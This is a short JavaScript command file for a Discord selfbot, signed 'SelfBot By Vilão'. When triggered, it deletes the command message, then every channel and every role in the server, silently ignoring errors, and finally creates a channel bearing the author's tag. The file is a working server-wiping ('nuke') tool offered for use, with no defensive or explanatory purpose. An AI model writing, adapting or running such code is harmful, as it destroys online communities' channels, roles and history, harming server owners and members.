﻿exports.run = async(client, msg) => {

  msg.delete().catch(() => {})

  await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
  await msg.guild.roles.map(r => r.delete().catch(() => {}))
  msg.guild.createChannel('SelfBot By Vilão', { type: 'text' }).catch(() => {})
}